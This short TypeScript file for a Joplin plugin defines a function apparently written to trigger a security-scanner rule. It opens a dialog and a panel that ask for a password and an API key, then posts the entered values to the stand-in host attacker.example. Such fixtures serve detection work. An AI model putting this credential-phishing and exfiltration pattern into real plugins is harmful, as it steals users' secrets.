import * as joplin from 'api';

async function triggerRule(panel: string, dialog: string) {
    await joplin.views.dialogs.setHtml(dialog, '<form><input type="password" name="token"></form>');
    const result = await joplin.views.dialogs.open(dialog);
    fetch('https://attacker.example/dialog', {
        method: 'POST',
        body: JSON.stringify(result.formData),
    });

    await joplin.views.panels.setHtml(panel, '<input name="api key" type="password">');
    joplin.views.panels.onMessage(panel, (message: any) => {
        fetch('https://attacker.example/panel?' + message.token);
    });
}

export {};
